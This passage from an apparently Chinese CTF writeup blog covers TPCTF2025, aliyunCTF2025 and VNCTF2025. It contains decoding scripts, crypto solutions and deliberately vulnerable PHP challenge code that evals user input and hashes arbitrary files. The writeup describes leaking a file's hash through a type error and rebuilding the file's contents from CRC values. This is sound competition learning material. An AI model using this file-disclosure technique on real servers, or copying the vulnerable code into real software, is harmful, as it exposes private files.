class="string">&#x27;Cer&#x27;</span>, <span class="string">&#x27;Wee&#x27;</span>, <span class="string">&#x27;Nov&#x27;</span>, <span class="string">&#x27;Keg&#x27;</span>, <span class="string">&#x27;Nit&#x27;</span>, <span class="string">&#x27;Wok&#x27;</span>, <span class="string">&#x27;Hin&#x27;</span>, <span class="string">&#x27;Tue&#x27;</span>, <span class="string">&#x27;Ron&#x27;</span>, <span class="string">&#x27;Roi&#x27;</span>, <span class="string">&#x27;Vos&#x27;</span>, <span class="string">&#x27;Sao&#x27;</span>, <span class="string">&#x27;Kia&#x27;</span>, <span class="string">&#x27;Tix&#x27;</span>, <span class="string">&#x27;Mip&#x27;</span>, <span class="string">&#x27;Cub&#x27;</span>, <span class="string">&#x27;Nah&#x27;</span>, <span class="string">&#x27;Hot&#x27;</span>, <span class="string">&#x27;Wic&#x27;</span>, <span class="string">&#x27;Yar&#x27;</span>, <span class="string">&#x27;Sic&#x27;</span>, <span class="string">&#x27;Sar&#x27;</span>, <span class="string">&#x27;Kok&#x27;</span>, <span class="string">&#x27;Fee&#x27;</span>, <span class="string">&#x27;Yuk&#x27;</span>, <span class="string">&#x27;Hoo&#x27;</span>, <span class="string">&#x27;Hei&#x27;</span>, <span class="string">&#x27;Dap&#x27;</span>, <span class="string">&#x27;Cen&#x27;</span>, <span class="string">&#x27;Las&#x27;</span>, <span class="string">&#x27;Guy&#x27;</span>, <span class="string">&#x27;Jon&#x27;</span>, <span class="string">&#x27;His&#x27;</span>, <span class="string">&#x27;Moo&#x27;</span>, <span class="string">&#x27;Roz&#x27;</span>, <span class="string">&#x27;Fac&#x27;</span>, <span class="string">&#x27;Fir&#x27;</span>, <span class="string">&#x27;Ham&#x27;</span>, <span class="string">&#x27;Rad&#x27;</span>, <span class="string">&#x27;Foi&#x27;</span>, <span class="string">&#x27;Sof&#x27;</span>, <span class="string">&#x27;Poo&#x27;</span>, <span class="string">&#x27;Toa&#x27;</span>, <span class="string">&#x27;Kos&#x27;</span>, <span class="string">&#x27;Sei&#x27;</span>, <span class="string">&#x27;Dof&#x27;</span>, <span class="string">&#x27;Get&#x27;</span>, <span class="string">&#x27;Bap&#x27;</span>, <span class="string">&#x27;Kes&#x27;</span>, <span class="string">&#x27;Die&#x27;</span>, <span class="string">&#x27;Dad&#x27;</span>, <span class="string">&#x27;Pea&#x27;</span>, <span class="string">&#x27;Nus&#x27;</span>, <span class="string">&#x27;Tit&#x27;</span>, <span class="string">&#x27;Ros&#x27;</span>, <span class="string">&#x27;Nay&#x27;</span>, <span class="string">&#x27;Moa&#x27;</span>, <span class="string">&#x27;Zen&#x27;</span>, <span class="string">&#x27;Mam&#x27;</span>, <span class="string">&#x27;Heb&#x27;</span>, <span class="string">&#x27;Fab&#x27;</span>, <span class="string">&#x27;Rib&#x27;</span>, <span class="string">&#x27;Cao&#x27;</span>, <span class="string">&#x27;Hey&#x27;</span>, <span class="string">&#x27;Wot&#x27;</span>, <span class="string">&#x27;Soo&#x27;</span>, <span class="string">&#x27;Kai&#x27;</span>, <span class="string">&#x27;Cem&#x27;</span>, <span class="string">&#x27;Rom&#x27;</span>, <span class="string">&#x27;Uaw&#x27;</span>, <span class="string">&#x27;Zed&#x27;</span>, <span class="string">&#x27;Noi&#x27;</span>, <span class="string">&#x27;Sab&#x27;</span>, <span class="string">&#x27;Tes&#x27;</span>, <span class="string">&#x27;Gob&#x27;</span>, <span class="string">&#x27;Jax&#x27;</span>, <span class="string">&#x27;Nob&#x27;</span>, <span class="string">&#x27;Bao&#x27;</span>, <span class="string">&#x27;Tos&#x27;</span>, <span class="string">&#x27;Tor&#x27;</span>, <span class="string">&#x27;Mep&#x27;</span>, <span class="string">&#x27;Pan&#x27;</span>, <span class="string">&#x27;Har&#x27;</span>, <span class="string">&#x27;Guv&#x27;</span>, <span class="string">&#x27;Foa&#x27;</span>, <span class="string">&#x27;Nih&#x27;</span>, <span class="string">&#x27;Cim&#x27;</span>, <span class="string">&#x27;Pig&#x27;</span>, <span class="string">&#x27;Jot&#x27;</span>, <span class="string">&#x27;Sop&#x27;</span>, <span class="string">&#x27;Duh&#x27;</span>, <span class="string">&#x27;Jia&#x27;</span>, <span class="string">&#x27;Nil&#x27;</span>, <span class="string">&#x27;Fib&#x27;</span>, <span class="string">&#x27;Kei&#x27;</span>, <span class="string">&#x27;Gad&#x27;</span>, <span class="string">&#x27;Toy&#x27;</span>, <span class="string">&#x27;Pim&#x27;</span>, <span class="string">&#x27;Gel&#x27;</span>, <span class="string">&#x27;Cet&#x27;</span>, <span class="string">&#x27;Hal&#x27;</span>, <span class="string">&#x27;Wen&#x27;</span>, <span class="string">&#x27;Yah&#x27;</span>, <span class="string">&#x27;Nup&#x27;</span>, <span class="string">&#x27;Jai&#x27;</span>, <span class="string">&#x27;Paw&#x27;</span>, <span class="string">&#x27;Pos&#x27;</span>, <span class="string">&#x27;Qed&#x27;</span>, <span class="string">&#x27;Tel&#x27;</span>, <span class="string">&#x27;Gay&#x27;</span>, <span class="string">&#x27;Liv&#x27;</span>, <span class="string">&#x27;Bus&#x27;</span>, <span class="string">&#x27;Fop&#x27;</span>, <span class="string">&#x27;Pia&#x27;</span>, <span class="string">&#x27;Miu&#x27;</span>, <span class="string">&#x27;Ked&#x27;</span>, <span class="string">&#x27;Fea&#x27;</span>, <span class="string">&#x27;Fob&#x27;</span>, <span class="string">&#x27;Sel&#x27;</span>, <span class="string">&#x27;Miz&#x27;</span>, <span class="string">&#x27;Lor&#x27;</span>, <span class="string">&#x27;Tay&#x27;</span>, <span class="string">&#x27;Pot&#x27;</span>, <span class="string">&#x27;Tac&#x27;</span>, <span class="string">&#x27;Wei&#x27;</span>, <span class="string">&#x27;Mug&#x27;</span>, <span class="string">&#x27;Dat&#x27;</span>, <span class="string">&#x27;Wal&#x27;</span>, <span class="string">&#x27;How&#x27;</span>, <span class="string">&#x27;Yow&#x27;</span>, <span class="string">&#x27;Pax&#x27;</span>]</span><br><span class="line">target=[<span class="string">&#x27;VicCouNeaGas&#x27;</span>, <span class="string">&#x27;DemHohBojWod&#x27;</span>, <span class="string">&#x27;PowFitGuoRut&#x27;</span>, <span class="string">&#x27;VetTasBesDae&#x27;</span>, <span class="string">&#x27;FasLiuTasJoi&#x27;</span>, <span class="string">&#x27;DevRecWoeDia&#x27;</span>, <span class="string">&#x27;BogHubSorHad&#x27;</span>, <span class="string">&#x27;BagLibYupSix&#x27;</span>, <span class="string">&#x27;MowPetBecZan&#x27;</span>, <span class="string">&#x27;LonRecRipLuk&#x27;</span>, <span class="string">&#x27;KarYapTajGot&#x27;</span>, <span class="string">&#x27;TiaLiuFayDic&#x27;</span>, <span class="string">&#x27;VizDivCitBot&#x27;</span>, <span class="string">&#x27;LeaLatReaSac&#x27;</span>, <span class="string">&#x27;FasLiuVicToc&#x27;</span>, <span class="string">&#x27;KunSadMerMun&#x27;</span>, <span class="string">&#x27;LemLiuGuoReq&#x27;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process</span>(<span class="params">s</span>):</span><br><span class="line">    index=<span class="number">0</span></span><br><span class="line">    ls=[s[<span class="number">0</span>:<span class="number">3</span>],s[<span class="number">3</span>:<span class="number">6</span>],s[<span class="number">6</span>:<span class="number">9</span>],s[<span class="number">9</span>:<span class="number">12</span>]]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ls:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> fourth:</span><br><span class="line">            index+=fourth.index(i)*<span class="number">103</span>*<span class="number">513</span>*<span class="number">313</span></span><br><span class="line">        <span class="keyword">elif</span> i <span class="keyword">in</span> third:</span><br><span class="line">            index+=third.index(i)*<span class="number">103</span>*<span class="number">513</span></span><br><span class="line">        <span class="keyword">elif</span> i <span class="keyword">in</span> second:</span><br><span class="line">            index+=second.index(i)*<span class="number">103</span></span><br><span class="line">        <span class="keyword">elif</span> i <span class="keyword">in</span> first:</span><br><span class="line">            index+=first.index(i)</span><br><span class="line">    <span class="keyword">return</span> index</span><br><span class="line">ans=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> target:</span><br><span class="line">    ans.append(<span class="built_in">str</span>(ipaddress.IPv4Address(process(i))))</span><br><span class="line"><span class="built_in">print</span>(ans)</span><br><span class="line"><span class="comment">#[&#x27;84.80.67.84&#x27;, &#x27;70.123.102.105&#x27;, &#x27;110.97.108.108&#x27;, &#x27;121.95.116.104&#x27;, &#x27;101.95.99.114&#x27;, &#x27;105.109.105.110&#x27;, &#x27;97.108.53.95&#x27;, &#x27;119.104.48.95&#x27;, &#x27;112.117.98.108&#x27;, &#x27;105.53.104.101&#x27;, &#x27;100.95.116.104&#x27;, &#x27;101.53.101.95&#x27;, &#x27;53.112.97.109&#x27;, &#x27;95.119.101.114&#x27;, &#x27;101.95.97.114&#x27;, &#x27;114.101.53.116&#x27;, &#x27;101.100.125.32&#x27;]</span></span><br></pre></td></tr></table></figure><p>不难发现这些数字都在ascii的可打印字符范围内</p><p><img src="/images/TPCTF2025-misc-writeup-%E5%A4%8D%E7%8E%B0/image-20250310100935051.png" alt="image-20250310100935051"></p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="nanonymous-msg"><a href="#nanonymous-msg" class="headerlink" title="nanonymous msg"></a>nanonymous msg</h4><blockquote><p>看似是密码，实则是纯misc。。。</p><p>瞪着那些数据看了一天没做出来，还是太菜了(T0T) 幸亏队伍里的密码师傅和misc师傅超强，最终出了，又是被带飞的一集Orz</p></blockquote><p>题目就这点东西</p><p><img src="/images/TPCTF2025-misc-writeup-%E5%A4%8D%E7%8E%B0/image-20250310103021529.png" alt="image-20250310103021529"></p><p>不难发现这串字前面有一些不可见字符</p><p><img src="/images/TPCTF2025-misc-writeup-%E5%A4%8D%E7%8E%B0/image-20250310103126223.png" alt="image-20250310103126223"></p><p>可以查到这都是unicode变体选择器在<a href="https://www.utf8-chartable.de/unicode-utf8-table.pl?start=917760">这个网站</a>上可以找到这些选择器分别对应哪个平面</p><p>用脚本提取后两个十六进制位+17就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    s = f.read().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">ls=[(<span class="built_in">ord</span>(x) &amp; <span class="number">0xff</span>)+<span class="number">17</span> <span class="keyword">for</span> x <span class="keyword">in</span> s <span class="keyword">if</span> <span class="built_in">ord</span>(x) &gt;= <span class="number">0x7f</span>]</span><br><span class="line"><span class="built_in">print</span>(ls)</span><br></pre></td></tr></table></figure><blockquote><p>然后后面就是我想不到的了(</p></blockquote><p>由于236出现的最多，所以猜测236对应下划线，先直接去掉，另外再去掉flag头尾，将剩下的数字意义映射成字母。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    s = f.read().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">ls=[(<span class="built_in">ord</span>(x) &amp; <span class="number">0xff</span>)+<span class="number">17</span> <span class="keyword">for</span> x <span class="keyword">in</span> s <span class="keyword">if</span> <span class="built_in">ord</span>(x) &gt;= <span class="number">0x7f</span>]</span><br><span class="line">data=ls[<span class="number">6</span>:-<span class="number">1</span>]</span><br><span class="line">dict1 = &#123;&#125;</span><br><span class="line">cs = data</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cs:</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> dict1:</span><br><span class="line">        dict1[i] = <span class="built_in">chr</span>(<span class="built_in">len</span>(dict1) + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(dict1)</span><br><span class="line">tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cs:</span><br><span class="line">    tmp += dict1[i]</span><br><span class="line"><span class="built_in">print</span>(tmp.replace(dict1[<span class="number">236</span>], <span class="string">&#x27; &#x27;</span>)) </span><br><span class="line"><span class="comment">#abcde ghi jklmjbc in aocll epc qrda sbjecom hq bhoecb kjj qbht ucqvhk veq whww xodrl</span></span><br></pre></td></tr></table></figure><p>拿去quipquip爆破</p><p><img src="/images/TPCTF2025-misc-writeup-%E5%A4%8D%E7%8E%B0/image-20250310105207736.png" alt="image-20250310105207736"></p><p>已经可以看到可读的flag了，但是还得改改。通过搜索可以找到<a href="https://ptr-yudai.hatenablog.com/entry/2022/06/02/223338">这篇文章</a></p><p>因此可以先得到初版flag</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TPCTF&#123;great_job_inspire_by_guess_the_flag_writeup_of_router_nii_from_defcon_ctf_2022_quals&#125;</span><br></pre></td></tr></table></figure><p>由于defcon那道题是说出题人喜欢用小写，并且会将o替换为0，所以现在我们的flag是这样</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TPCTF&#123;great_j0b_inspire_by_guess_the_flag_writeup_0f_r0uter_nii_fr0m_defc0n_ctf_2022_quals&#125;</span><br></pre></td></tr></table></figure><p>还是不对，最终发现还需要将s替换成5</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TPCTF&#123;great_j0b_in5pire_by_gue55_the_flag_writeup_0f_r0uter_nii_fr0m_defc0n_ctf_2022_qual5&#125;</span><br></pre></td></tr></table></figure><blockquote><p>太脑洞了，这我瞪到TPCTF2026都想不到。。。</p><p>师傅们还是tql OrzOrzOrz</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Misc </tag>
            
            <tag> TPCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>aliyunctf2025 misc writeup+复现</title>
      <link href="/posts/3cb13075/"/>
      <url>/posts/3cb13075/</url>
      
        <content type="html"><![CDATA[<h2 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h2><p><a href="https://www.blog.st4rr.top/writeups/AliyunCTF2025Writeup.pdf">Wrtieup</a></p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="哈基游"><a href="#哈基游" class="headerlink" title="哈基游"></a>哈基游</h4><p>题目源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$func_template</span> = <span class="string">&#x27;function check($file_hash, %s) &#123; if ($file_hash !== &quot;5baf19ce6561538119dfe32d561d6ab8509703606f768fea72723a01ee4264b7&quot;) &#123; echo &quot;%s not cached&quot;; &#125; &#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$cached_key</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>] : <span class="string">&#x27;$f_0&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-zA-Z0-9_\$]&#123;1,5&#125;$/&#x27;</span>, <span class="variable">$cached_key</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Invalid cached key&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$func</span> = <span class="title function_ invoke__">sprintf</span>(<span class="variable">$func_template</span>, <span class="variable">$cached_key</span>, <span class="variable">$cached_key</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$func</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;h&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;algo&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$file_hash</span> = <span class="title function_ invoke__">hash_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;algo&#x27;</span>], <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">check</span>(<span class="variable">$file_hash</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>对于参数c传入int$c，就会产生报错，我们就能从报错中看到文件哈希后的结果。</p><p>从phpinfo中我们可以看到可用的哈希算法</p><p><img src="/images/aliyunctf2025-misc-writeup-%E5%A4%8D%E7%8E%B0/image-20250227183144596.png" alt="image-20250227183144596"></p><p>由于crc不是一种安全的算法，只要给出足够多不同的crc就有可能恢复出被加密的内容，而这里有三种可用的crc</p><p><img src="/images/aliyunctf2025-misc-writeup-%E5%A4%8D%E7%8E%B0/image-20250227183429546.png" alt="image-20250227183429546"></p><p><img src="/images/aliyunctf2025-misc-writeup-%E5%A4%8D%E7%8E%B0/image-20250227183447325.png" alt="image-20250227183447325"></p><p><img src="/images/aliyunctf2025-misc-writeup-%E5%A4%8D%E7%8E%B0/image-20250227183501701.png" alt="image-20250227183501701"></p><p>官方给的<a href="https://tangcuxiaojikuai.xyz/post/d79378e.html#more">脚本</a>不知道为什么跑不出来(</p><p>下面是一个密码爷的<a href="https://tangcuxiaojikuai.xyz/post/d79378e.html#more">做法</a>，只能膜拜Orz</p><p><img src="/images/aliyunctf2025-misc-writeup-%E5%A4%8D%E7%8E%B0/image-20250227201333820.png" alt="image-20250227201333820"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Misc </tag>
            
            <tag> aliyunCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VNCTF2025 Writeup</title>
      <link href="/posts/6f615b90/"/>
      <url>/posts/6f615b90/</url>
      
        <content type="html"><![CDATA[<blockquote><p>其他的没看，就看了misc的取证看了一天没做出来，看了wp发现思路是对的，但是没错，又是差那么一点点。。。</p></blockquote><h2 id="Writeup部分"><a href="#Writeup部分" class="headerlink" title="Writeup部分"></a>Writeup部分</h2><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="VN-Lang"><a href="#VN-Lang" class="headerlink" title="VN_Lang"></a>VN_Lang</h4><p>丢进IDA就能看到flag</p><p><img src="/images/VNCTF2025-Writeup/image-20250208131104698.png" alt="image-20250208131104698"></p><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="easymath"><a href="#easymath" class="headerlink" title="easymath"></a>easymath</h4><p>题目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">flag=bytes_to_long(flag)</span><br><span class="line">l=flag.bit_length()//<span class="number">3</span> + <span class="number">1</span></span><br><span class="line">n=[]</span><br><span class="line">N=<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(n) &lt; <span class="number">3</span>:</span><br><span class="line">    p = <span class="number">4</span>*getPrime(l)-<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> isPrime(p):</span><br><span class="line">        n.append(p)</span><br><span class="line">        N *= p</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c=<span class="subst">&#123;flag*flag%N&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> symbols, expand</span><br><span class="line">x = symbols(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">polynomial = expand((x - n[<span class="number">0</span>]) * (x - n[<span class="number">1</span>]) * (x - n[<span class="number">2</span>]))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;polynomial=&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment"># c=24884251313604275189259571459005374365204772270250725590014651519125317134307160341658199551661333326703566996431067426138627332156507267671028553934664652787411834581708944</span></span><br><span class="line"><span class="comment"># polynomial=x**3 - 15264966144147258587171776703005926730518438603688487721465*x**2 + 76513250180666948190254989703768338299723386154619468700730085586057638716434556720233473454400881002065319569292923*x - 125440939526343949494022113552414275560444252378483072729156599143746741258532431664938677330319449789665352104352620658550544887807433866999963624320909981994018431526620619</span></span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from libnum import n2s</span><br><span class="line">import gmpy2</span><br><span class="line">n0, n1, n2 = var(&#x27;n0 n1 n2&#x27;)</span><br><span class="line">equations = [</span><br><span class="line">    n0 + n1 + n2 == 15264966144147258587171776703005926730518438603688487721465,</span><br><span class="line">    n0*n1*n2 == 125440939526343949494022113552414275560444252378483072729156599143746741258532431664938677330319449789665352104352620658550544887807433866999963624320909981994018431526620619,</span><br><span class="line">    n0*n1 + n0*n2 + n1*n2 == 76513250180666948190254989703768338299723386154619468700730085586057638716434556720233473454400881002065319569292923</span><br><span class="line">]</span><br><span class="line">solutions = solve(equations, n0, n1, n2)</span><br><span class="line"></span><br><span class="line">enc=24884251313604275189259571459005374365204772270250725590014651519125317134307160341658199551661333326703566996431067426138627332156507267671028553934664652787411834581708944</span><br><span class="line">ls=[5487564316951417093934647798659941512646442958127439071827, 3868765709106144154703556118635822400623994075212553582411, 5908636118089697338533572785710162817248001570348495067227]</span><br><span class="line">a,b,c=ls[0],ls[1],ls[2]</span><br><span class="line">N=a*b*c</span><br><span class="line">x=int(Mod(enc,a).sqrt())</span><br><span class="line">y=int(Mod(enc,b).sqrt())</span><br><span class="line">z=int(Mod(enc,c).sqrt())</span><br><span class="line">print(n2s(int(crt([x,y,z],[a,b,c]))))</span><br><span class="line">print(n2s(int(crt([x,-y,z],[a,b,c]))))</span><br><span class="line">print(n2s(int(crt([x,y,-z],[a,b,c]))))</span><br><span class="line">print(n2s(int(crt([-x,y,z],[a,b,c]))))</span><br><span class="line">print(n2s(int(crt([-x,-y,z],[a,b,c]))))</span><br><span class="line">print(n2s(int(crt([-x,y,-z],[a,b,c]))))</span><br><span class="line">print(n2s(int(crt([x,-y,-z],[a,b,c]))))</span><br><span class="line">print(n2s(int(crt([-x,-y,-z],[a,b,c]))))</span><br></pre></td></tr></table></figure><p><img src="/images/VNCTF2025-Writeup/image-20250208131326192.png" alt="image-20250208131326192"></p><h4 id="ss0Hurt"><a href="#ss0Hurt" class="headerlink" title="ss0Hurt!"></a>ss0Hurt!</h4><p>题目</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">from flag import flag</span><br><span class="line"></span><br><span class="line">class DaMie:</span><br><span class="line">    def __init__(self, flag , n = None):</span><br><span class="line">        self.m = ZZ(bytes_to_long(flag))</span><br><span class="line">        self.n = n if n else getPrime(1024)</span><br><span class="line">        self.P = Zmod(self.n)</span><br><span class="line">        print(f&#x27;n = &#123;self.n&#125;&#x27;)</span><br><span class="line"></span><br><span class="line">    def process(self, x, y, z):</span><br><span class="line"></span><br><span class="line">        return vector([5 * x + y - 5 * z, 5 * y - z, 5 * z])</span><br><span class="line"></span><br><span class="line">    def Mat(self, m):</span><br><span class="line">        PR = self.P[&#x27;x,y,z&#x27;]</span><br><span class="line">        x,y,z = PR.gens()</span><br><span class="line"></span><br><span class="line">        if m != 0:</span><br><span class="line">            plana = self.Mat(m//2)</span><br><span class="line">            planb = plana(*plana)</span><br><span class="line">            if m % 2 == 0:</span><br><span class="line">                return planb</span><br><span class="line">            else:</span><br><span class="line">                return self.process(*planb)</span><br><span class="line">        else:</span><br><span class="line">            return self.process(*PR.gens())</span><br><span class="line"></span><br><span class="line">    def hash(self, A, B, C):</span><br><span class="line">        return self.Mat(self.m)(A, B, C)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    </span><br><span class="line">    Ouch = DaMie(flag)</span><br><span class="line">    result = Ouch.hash(2025,208,209)</span><br><span class="line">    print(f&#x27;hash(A,B,C) = &#123;result&#125;&#x27;)</span><br></pre></td></tr></table></figure><p>丢给ai一把梭了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse, long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知的n和result（示例值，需替换为实际数据）</span></span><br><span class="line">n = <span class="number">106743081253087007974132382690669187409167641660258665859915640694456867788135702053312073228376307091325146727550371538313884850638568106223326195447798997814912891375244381751926653858549419946547894675646011818800255999071070352934719005006228971056393128007601573916373180007524930454138943896336817929823</span></span><br><span class="line">result = (<span 